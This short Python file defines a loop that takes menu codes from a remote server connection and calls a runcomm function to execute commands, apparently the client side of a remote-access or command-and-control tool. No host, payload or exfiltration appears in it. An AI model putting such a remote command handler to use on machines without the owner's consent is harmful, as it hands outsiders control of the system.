import socket
from colorama import Fore
from core.command import runcomm

def handleConnection(socket):
    print(Fore.RED + "[-] Handling server connection...")

    while True:
        usr_input = socket.receive_data()

        print(Fore.GREEN + "[+] User input: ", usr_input)

        if usr_input == "1":
            print(Fore.GREEN + "[+] Running commands...")

            runcomm(socket)

        elif usr_input == "99":
            break

        else:
            print("[+] Invalid input.")